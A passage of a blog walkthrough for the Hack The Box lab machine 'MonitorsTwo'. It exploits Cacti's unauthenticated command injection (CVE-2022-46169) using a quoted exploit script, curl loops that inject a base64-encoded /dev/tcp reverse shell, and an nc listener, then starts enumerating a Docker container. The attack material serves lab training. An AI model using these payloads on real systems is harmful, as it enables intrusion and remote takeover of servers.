<!doctype html><html lang="en"><head><title>MonitorsTwo | 7Rocky</title>
<meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="description" content="Hack The Box. Linux. Easy machine. This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get root in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges"><meta name="image" content="https://7rocky.github.io/images/HTB/MonitorsTwo/MonitorsTwo.webp"><meta name="robots" content="index, follow"><meta name="viewport" content="width=device-width,minimum-scale=1"><meta itemprop="description" content="Hack The Box. Linux. Easy machine. This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get root in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges"><meta itemprop="keywords" content="cve,docker,suid,password-reuse,command-injection,rce,directory-path-traversal,"><meta itemprop="name" content="MonitorsTwo"><meta property="article:published_time" content="2023-09-02T00:00:00+00:00"><meta property="og:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:description" content="Hack The Box. Linux. Easy machine. This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get root in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges"><meta property="og:image" content="https://7rocky.github.io/images/HTB/MonitorsTwo/MonitorsTwo.webp"><meta property="og:locale" content="en_US"><meta property="og:site_name" content="7Rocky's Blog. Cybersecurity and Maths"><meta property="og:title" content="MonitorsTwo"><meta property="og:type" content="article"><meta property="og:url" content="https://7rocky.github.io/en/htb/monitorstwo/"><meta name="twitter:author" content="7Rocky's Blog. Cybersecurity and Maths"><meta name="twitter:card" content="Hack The Box. Linux. Easy machine. This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get root in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges"><meta name="twitter:description" content="Hack The Box. Linux. Easy machine. This machine has a Cacti service that is vulnerable to unauthenticated Remote Code Execution that grants access to a Docker container. Here we can find credentials in the database and reuse them for SSH on the host machine. Then, we find out that the Docker version is vulnerable to a CVE. To exploit this, we need to get root in the container and configure a SUID binary that will be executed from the host machine via directory traversal to escalate privileges"><meta name="twitter:image" content="https://7rocky.github.io/images/HTB/MonitorsTwo/MonitorsTwo.webp"><meta name="twitter:title" content="MonitorsTwo"><link href="/favicon.ico" rel="shortcut icon" type="image/x-icon"><link href="/css/style.css" rel="stylesheet"><link href="/css/main.css" rel="stylesheet"><link href="/css/code.css" rel="stylesheet"><link href="https://7rocky.github.io/en/htb/monitorstwo/" rel="canonical"><script async src="https://www.googletagmanager.com/gtag/js?id=G-Z1HQGH3M4D"></script><script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-Z1HQGH3M4D",{anonymize_ip:!1})}</script></head><body class="ma0 production"><header style="position:sticky;top:0;z-index:9"><div class="bg-black"><nav class="ph4-ns" id="navigation" role="navigation"><div class="flex-l justify-between items-center center"><a class="f3 fw2 hover-white no-underline white-90 dib" href="/en/" title="7Rocky">7Rocky</a><div class="flex-l items-center"><a href="/en/search" target class="link-transition link dib z-999 pt3 pt0-l mr1 search-link" title="Search" rel="noopener" aria-label="Search"><svg height="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 487.95 487.95" style="enable-background:new 0 0 487.95 487.95"><g><g><path d="M481.8 453l-140-140.1c27.6-33.1 44.2-75.4 44.2-121.6C386 85.9 299.5.2 193.1.2S0 86 0 191.4s86.5 191.1 192.9 191.1c45.2.0 86.8-15.5 119.8-41.4l140.5 140.5c8.2 8.2 20.4 8.2 28.6.0C490 473.4 490 461.2 481.8 453zM41 191.4c0-82.8 68.2-150.1 151.9-150.1s151.9 67.3 151.9 150.1-68.2 150.1-151.9 150.1S41 274.1 41 191.4z" style="fill-rule:evenodd;clip-rule:evenodd;fill:#a9a9b3"/></g></g><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/><g/></svg></a><a class="link-transition lang link dib z-999 pt3 pt0-l mr3" href="/htb/monitorstwo/" title="es"><img alt="es" height="30px" src="/images/es.png" style="border:4px solid#000;border-radius:100%" width="30px">
</a><a class="link-transition lang link dib z-999 pt3 pt0-l" href="#" title="en"><img alt="en" height="30px" src="/images/en.png" width="30px"></a><ul class="pl0 ml3 mr3" style="line-height:30px"><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/ctf/" title="CTF">CTF</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/htb/" title="HTB">HTB</a></li><li class="list f5 f4-ns fw4 dib pr2 pl2"><a class="hover-white no-underline white-90" href="/en/imc/" title="IMC">IMC</a></li></ul><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></nav></div></header><main class="pb5" role="main" style="min-height:720px"><article class="flex-l flex-wrap justify-between mw8 center ph3"><header class="mt4 w-80-l"><a aria-label="aside" class="instapaper_ignoref b tracked" href="../" style="font-size:1.2rem">&lt;- HTB</a><div id="sharing" class="mt3"><a aria-label="share on Facebook" class="facebook no-underline" href="https://www.facebook.com/sharer.php?u=https://7rocky.github.io/en/htb/monitorstwo/" title="share on Facebook"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M28.765 50.32h6.744V33.998h4.499l.596-5.624h-5.095l.007-2.816c0-1.466.14-2.253 2.244-2.253h2.812V17.68h-4.5c-5.405.0-7.307 2.729-7.307 7.317v3.377h-3.369v5.625h3.369V50.32zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd"/></svg></a><a aria-label="share on Twitter" class="twitter no-underline" href="https://twitter.com/share?url=https://7rocky.github.io/en/htb/monitorstwo/&amp;text=MonitorsTwo" title="share on Twitter"><svg height="32" style="enable-background:new 0 0 67 67" viewBox="0 0 67 67" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M37.167 22.283c-2.619.953-4.274 3.411-4.086 6.101l.063 1.038-1.048-.127c-3.813-.487-7.145-2.139-9.974-4.915l-1.383-1.377-.356 1.017c-.754 2.267-.272 4.661 1.299 6.271.838.89.649 1.017-.796.487-.503-.169-.943-.296-.985-.233-.146.149.356 2.076.754 2.839.545 1.06 1.655 2.097 2.871 2.712l1.027.487-1.215.021c-1.173.0-1.215.021-1.089.467.419 1.377 2.074 2.839 3.918 3.475l1.299.444-1.131.678c-1.676.976-3.646 1.526-5.616 1.568C19.775 43.256 19 43.341 19 43.405c0 .211 2.557 1.397 4.044 1.864 4.463 1.377 9.765.783 13.746-1.568 2.829-1.673 5.657-5 6.978-8.221.713-1.716 1.425-4.851 1.425-6.354.0-.975.063-1.102 1.236-2.267.692-.678 1.341-1.419 1.467-1.631.21-.403.188-.403-.88-.043-1.781.636-2.033.551-1.152-.402.649-.678 1.425-1.907 1.425-2.267.0-.063-.314.042-.671.233-.377.212-1.215.53-1.844.72l-1.131.361-1.027-.7c-.566-.381-1.361-.805-1.781-.932C39.766 21.902 38.131 21.944 37.167 22.283zM33 64C16.432 64 3 50.569 3 34S16.432 4 33 4s30 13.431 30 30S49.568 64 33 64z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a><a aria-label="share on LinkedIn" class="linkedin no-underline" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://7rocky.github.io/en/htb/monitorstwo/&amp;title=MonitorsTwo" title="share on LinkedIn"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></a></div><h1 class="f1 mt3 mb1">MonitorsTwo</h1><time class="mt4 f6 dib tracked" datetime="2023-09-02T00:00:00+01:00">02 / 09 / 2023</time><br><p class="mb4 f6 dib tracked">13 minutes to read</p></header><div class="htb-image"><img alt="MonitorsTwo" src="/images/HTB/MonitorsTwo/MonitorsTwo.webp"></div><ul class="nested-links tags"><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/cve" title="CVE">CVE</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/docker" title="Docker">Docker</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/suid" title="SUID Binary">SUID Binary</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/password-reuse" title="Password reuse">Password reuse</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/command-injection" title="Command Injection">Command Injection</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/rce" title="Remote Code Execution">Remote Code Execution</a></li><li class="list"><a class="link f5 grow no-underline br-pill ba ph3 pv2 mb2 dib black sans-serif" href="/en/tags/directory-path-traversal" title="Directory Path Traversal">Directory Path Traversal</a></li></ul><aside aria-label="aside" class="w-20-l mt6-l aside-mobile"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#enumeration">Enumeration</a></li><li><a href="#foothold">Foothold</a></li><li><a href="#container-enumeration">Container enumeration</a><ul><li><a href="#testing">Testing</a></li></ul></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation">Privilege escalation</a><ul><li><a href="#container">Container</a></li><li><a href="#docker-exploit">Docker exploit</a></li></ul></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside><div class="nested-copy-line-height lh-copy serif f4 nested-links nested-img pr4-l w-80-l"><ul><li><strong>OS</strong>: Linux</li><li><strong>Difficulty</strong>: Easy</li><li><strong>IP Address</strong>: 10.10.11.211</li><li><strong>Release</strong>: 29 / 04 / 2023</li></ul><h2 id="port-scanning">Port scanning</h2><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"># Nmap 7.93 scan initiated as: nmap -sC -sV -o nmap/targeted 10.10.11.211 -p 22,80
Nmap scan report for 10.10.11.211
Host is up (0.037s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48add5b83a9fbcbef7e8201ef6bfdeae (RSA)
|   256 b7896c0b20ed49b2c1867c2992741c1f (ECDSA)
|_  256 18cd9d08a621a8b8b6f79f8d405154fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
# Nmap done -- 1 IP address (1 host up) scanned in 9.48 seconds
</code></pre></div><p>This machine has port 22 (SSH) and 80 (HTTP) open.</p><h2 id="enumeration">Enumeration</h2><p>If we go to <code>http://10.10.11.211</code>, we will see this login form:</p><p><img src="/images/HTB/MonitorsTwo/MonitorsTwo-1.webp" alt="MonitorsTwo 1"></p><p>We can try default credentials, but they do not work. What is very interesting is that we have a service name and version (Cacti 1.2.22). If we search for exploits, we will find one that matches with this version:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">searchsploit</span> cacti 1.2.22
------------------------------------------------ ----------------------  
 Exploit Title                                  | Path
------------------------------------------------ ----------------------
 <span class="code-red">Cacti</span> v<span class="code-red">1.2.22</span> - Remote Command Execution (RCE) | php/webapps/51166.py
------------------------------------------------ ----------------------
Shellcodes: No Results
</code></pre></div><p>Looking at the <a href="https://www.exploit-db.com/exploits/51166">exploit</a> for <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-46169">CVE-2022-46169</a>, we guess that it exploits a command injection vulnerability to get Remote Code Execution (RCE):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">exploit</span><span class="mtk1">(</span><span class="mtk9 mtki">self</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk3"># cacti local ip from the url for the X-Forwarded-</span><span class="mtk3">For header</span>
<span class="mtk1">        </span><span class="mtk1">local_cacti_ip</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">url</span><span class="mtk1">.split(</span><span class="mtk4">"//"</span><span class="mtk1">)[</span><span class="mtk6">1</span><span class="mtk1">].split(</span><span class="mtk4">"/"</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">]</span>

<span class="mtk1">        </span><span class="mtk1">headers</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span>
<span class="mtk1">            </span><span class="mtk4">'X-Forwarded-For'</span><span class="mtk1">: </span><span class="mtk7 mtki">f</span><span class="mtk4">'</span><span class="mtk6">{</span><span class="mtk1">local_cacti_ip</span><span class="mtk6">}</span><span class="mtk4">'</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk1">revshell</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">"bash -c 'exec bash -i &amp;&gt;/dev/tcp/</span><span class="mtk6">{</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rs_host</span><span class="mtk6">}</span><span class="mtk4">/</span><span class="mtk6">{</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">rs_port</span><span class="mtk6">}</span><span class="mtk4"> &lt;&amp;1'"</span>
<span class="mtk1">        </span><span class="mtk5">import</span><span class="mtk1"> </span><span class="mtk8 mtku">base64</span>
<span class="mtk1">        </span><span class="mtk1">b64_revshell</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">base64</span><span class="mtk1">.</span><span class="mtk8">b64encode</span><span class="mtk1">(</span><span class="mtk1">revshell</span><span class="mtk1">.</span><span class="mtk8">encode</span><span class="mtk1">()).</span><span class="mtk8">decode</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7 mtki">f</span><span class="mtk4">";echo </span><span class="mtk6">{</span><span class="mtk1">b64_revshell</span><span class="mtk6">}</span><span class="mtk4"> | base64 -d | bash -"</span>
<span class="mtk1">        </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">urllib</span><span class="mtk1">.parse.quote(</span><span class="mtk1">payload</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk1">urls</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> []</span>

<span class="mtk1">        </span><span class="mtk3"># Adjust the range to fit your needs ( wider the r</span><span class="mtk3">ange, longer the script will take to run the more </span><span class="mtk3">success you will have achieving a reverse shell)</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">host_id</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span><span class="mtk6">100</span><span class="mtk1">):</span>
<span class="mtk1">            </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">local_data_ids</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">1</span><span class="mtk1">,</span><span class="mtk6">100</span><span class="mtk1">):</span>
<span class="mtk1">                </span><span class="mtk1">urls</span><span class="mtk1">.</span><span class="mtk8">append</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">url</span><span class="mtk6">}</span><span class="mtk4">/remote_agent.php?action=polldata&amp;local_data_ids[]</span><span class="mtk4">=</span><span class="mtk6">{</span><span class="mtk1">local_data_ids</span><span class="mtk6">}</span><span class="mtk4">&amp;host_id=</span><span class="mtk6">{</span><span class="mtk1">host_id</span><span class="mtk6">}</span><span class="mtk4">&amp;poller_id=1</span><span class="mtk6">{</span><span class="mtk1">payload</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1">)</span>  

<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">url</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">urls</span><span class="mtk1">:</span>
<span class="mtk1">            </span><span class="mtk1">r</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk9 mtki">self</span><span class="mtk1">.</span><span class="mtk1">session</span><span class="mtk1">.get(</span><span class="mtk1">url</span><span class="mtk1">,</span><span class="mtk9 mtki">headers</span><span class="mtk5">=</span><span class="mtk1">headers</span><span class="mtk1">)</span>
<span class="mtk1">            </span><span class="mtk8">print</span><span class="mtk1">(</span><span class="mtk7 mtki">f</span><span class="mtk4">"</span><span class="mtk6">{</span><span class="mtk1">r</span><span class="mtk1">.status_code</span><span class="mtk6">}</span><span class="mtk4"> - </span><span class="mtk6">{</span><span class="mtk1">r</span><span class="mtk1">.text</span><span class="mtk6">}</span><span class="mtk4">"</span><span class="mtk1"> )</span>
<span class="mtk1">        </span><span class="mtk5">pass</span>
</code></pre></div><p>We can actually test this manually with <code>curl</code> instead of using another one&rsquo;s exploit. The procedure tries to find two numbers for <code>local_data_ids[]</code> and for <code>host_id</code> with a double <code>for</code> loop. The header <code>X-Forwarded-For</code> must be set to <code>127.0.0.1</code> to bypass some checks (more information <a href="https://github.com/0xf4n9x/CVE-2022-46169">here</a> and <a href="https://www.sonarsource.com/blog/cacti-unauthenticated-remote-code-execution/">here</a>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> i in {1..5}; <span class="code-dark-yellow">do</span> <span class="code-dark-yellow">for</span> j in {1..5}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">"<span class="code-dark-cyan">$i</span>, <span class="code-dark-cyan">$j</span>: "</span>; <span class="code-dark-green">curl</span> -H <span class="code-dark-yellow">'X-Forwarded-For: 127.0.0.1'</span> <span class="code-dark-yellow">"10.10.11.211/remote_agent.php?action=polldata&amp;local_data_ids[]=<span class="code-dark-cyan">$i</span>&amp;host_id=<span class="code-dark-cyan">$j</span>&amp;poller_id=1"</span>; <span class="code-dark-green">echo</span>; <span class="code-dark-yellow">done</span>; <span class="code-dark-yellow">done</span>  
1, 1: [{"value":"16","rrd_name":"proc","local_data_id":"1"}]
1, 2: []
1, 3: []
1, 4: []
1, 5: []
2, 1: [{"value":"1min:0.01 5min:0.56 10min:0.45","rrd_name":"","local_data_id":"2"}]
2, 2: []
2, 3: []
2, 4: []
2, 5: []
3, 1: [{"value":"0","rrd_name":"users","local_data_id":"3"}]
3, 2: []
3, 3: []
3, 4: []
3, 5: []
4, 1: [{"value":"2967280","rrd_name":"mem_buffers","local_data_id":"4"}]
4, 2: []
4, 3: []
4, 4: []
4, 5: []
5, 1: [{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"}]
5, 2: []
5, 3: []
5, 4: []
5, 5: []
</code></pre></div><p>Once we have found them (the ones that output some data), we can try to exploit the command injection vulnerability.</p><h2 id="foothold">Foothold</h2><p>Let&rsquo;s encode a reverse shell payload in Base64 and start a <code>nc</code> listener:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">'bash  -i &gt;& /dev/tcp/10.10.17.44/4444 0&gt;&1'</span> | <span class="code-dark-green">base64</span>  
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx

<span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
</code></pre></div><p>Then, we can add the command injection payload to execute the reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> i in {1..10}; <span class="code-dark-yellow">do</span> <span class="code-dark-green">curl</span> -H <span class="code-dark-yellow">'X-Forwarded-For: 127.0.0.1'</span> <span class="code-dark-yellow">"10.10.11.211/remote_agent.php?action=polldata&amp;local_data_ids[]=<span class="code-dark-cyan">$i</span>&amp;host_id=<span class="code-dark-cyan">$j</span>&amp;poller_id=1;echo+YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTAzLzQ0NDQgMD4mMSAg+|+base64+-d+|+bash"</span>; <span class="code-dark-green">echo</span>; <span class="code-dark-yellow">done</span>  
[{"value":"16","rrd_name":"proc","local_data_id":"1"}]
[{"value":"1min:0.02 5min:0.16 10min:0.29","rrd_name":"","local_data_id":"2"}]
[{"value":"0","rrd_name":"users","local_data_id":"3"}]
[{"value":"2944376","rrd_name":"mem_buffers","local_data_id":"4"}]
[{"value":"1048572","rrd_name":"mem_swap","local_data_id":"5"}]
</code></pre></div><p>As can be seen, at the fifth iteration it stops and we obtain the reverse shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">nc</span> -nlvp 4444
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.211.
Ncat: Connection from 10.10.11.211:59542.
bash: cannot set terminal process group (1): Inappropriate ioctl for device  
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
www-data@50bca5e748b0:/var/www/html$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class="code-cyan">$</span> <span class="code-dark-green">stty</span> raw -echo; <span class="code-dark-green">fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
www-data@50bca5e748b0:/var/www/html$ export TERM=xterm
www-data@50bca5e748b0:/var/www/html$ export SHELL=bash
www-data@50bca5e748b0:/var/www/html$ stty rows 50 columns 158
</code></pre></div><h2 id="container-enumeration">Container enumeration</h2><p>We are inside a Docker container (notice the host name and the <code>.dockerenv</code> file):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">www-data@50bca5e748b0:/var/www/html$ hostname
50bca5e748b0
www-data@50bca5e748b0:/var/www/html$ ls -la /
total 108
drwxr-xr-x   1 root root  4096 Mar 21 10:49 .
drwxr-xr-x   1 root root  4096 Mar 21 10:49 ..
-rwxr-xr-x   1 root root     0 Mar 21 10:49 .dockerenv
drwxr-xr-x   1 root root  4096 Mar 22 13:21 bin
drwxr-xr-x   2 root root  4096 Mar 22 13:21 boot
drwxr-xr-x   5 root root   340 May  2 13:53 dev
-rw-r--r--   1 root root   648 Jan  5 11:37 entrypoint.sh  
drwxr-xr-x   1 root root  4096 Mar 21 10:49 etc
drwxr-xr-x   2 root root  4096 Mar 22 13:21 home
drwxr-xr-x   1 root root  4096 Nov 15 04:13 lib
drwxr-xr-x   2 root root  4096 Mar 22 13:21 lib64
drwxr-xr-x   2 root root  4096 Mar 22 13:21 media
